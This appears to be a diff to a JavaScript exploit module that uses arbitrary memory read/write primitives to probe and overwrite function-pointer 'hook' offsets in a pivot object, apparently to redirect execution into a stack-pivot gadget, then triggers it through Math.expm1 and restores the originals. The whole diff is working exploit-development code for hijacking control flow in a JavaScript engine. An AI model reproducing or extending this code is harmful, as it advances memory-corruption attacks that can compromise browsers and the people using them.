@@ -313,6 +313,47 @@ export function verifySlabAddrs(p, prep) {
     return out;
 }
 
+/** Read-only — dump pivot object cell for hook offset hunt. */
+export function probePivotCell(p, pivotCell) {
+    const rows = [];
+    if (!p || !pivotCell) return rows;
+    for (let o = 0; o <= 0x40; o += 8) {
+        let val = null;
+        try { val = p.read8(pivotCell.add32(o)); } catch (_) { val = null; }
+        rows.push({ off: o, val });
+    }
+    return rows;
+}
+
+/** Hook store S at pivotCell+off (explicit offset, ignores pivot_hook_off). */
+export function bisectHookPivotAt(p, prep, hookOff) {
+    if (!prep || !prep.pivotCell || !prep.M)
+        throw new Error("bisectHookPivotAt: no prep");
+    const site = prep.pivotCell.add32(hookOff);
+    if (!prep._bisect) prep._bisect = {};
+    prep._bisect.pivotSite = site;
+    prep._bisect.pivotHookOff = hookOff;
+    prep._bisect.pivotSaved = p.read8(site);
+    p.write8(site, prep.M.S);
+    return site;
+}
+
+/** Poison several pivotCell offsets at once (G0 rsi+0x30 hunt). */
+export function bisectHookPivotMulti(p, prep, hookOffs) {
+    if (!prep || !prep.pivotCell || !prep.M)
+        throw new Error("bisectHookPivotMulti: no prep");
+    if (!prep._bisect) prep._bisect = {};
+    const saved = [];
+    for (let i = 0; i < hookOffs.length; i++) {
+        const site = prep.pivotCell.add32(hookOffs[i]);
+        saved.push({ site, off: hookOffs[i], val: p.read8(site) });
+        p.write8(site, prep.M.S);
+    }
+    prep._bisect.multiSaved = saved;
+    prep._bisect.pivotSite = saved.length ? saved[0].site : prep.pivotCell;
+    return saved;
+}
+
 function writePivotHook(p, prep, off) {
     const site = pivotHookCell(prep, off);
     if (!prep._bisect) prep._bisect = {};
@@ -371,12 +412,19 @@ export function bisectFireExpm1(p, prep) {
     Math.expm1(prep.pivotObj);
 }
 
-/** Bisect step 6 — restore pivot hook site + main m_function. */
+/** Bisect step 6 — restore pivot hook site(s) + main m_function. */
 export function bisectRestore(p, prep) {
     if (!prep) return;
-    const site = (prep._bisect && prep._bisect.pivotSite) || prep.pivotCell;
-    if (prep._bisect && prep._bisect.pivotSaved != null)
-        p.write8(site, prep._bisect.pivotSaved);
+    if (prep._bisect && prep._bisect.multiSaved) {
+        for (let i = 0; i < prep._bisect.multiSaved.length; i++) {
+            const e = prep._bisect.multiSaved[i];
+            if (e.val != null) p.write8(e.site, e.val);
+        }
+    } else {
+        const site = (prep._bisect && prep._bisect.pivotSite) || prep.pivotCell;
+        if (prep._bisect && prep._bisect.pivotSaved != null)
+            p.write8(site, prep._bisect.pivotSaved);
+    }
     if (prep.mainMf && prep.mainOrig)
         p.write8(prep.mainMf, prep.mainOrig);
     prep.mainArmed = false;
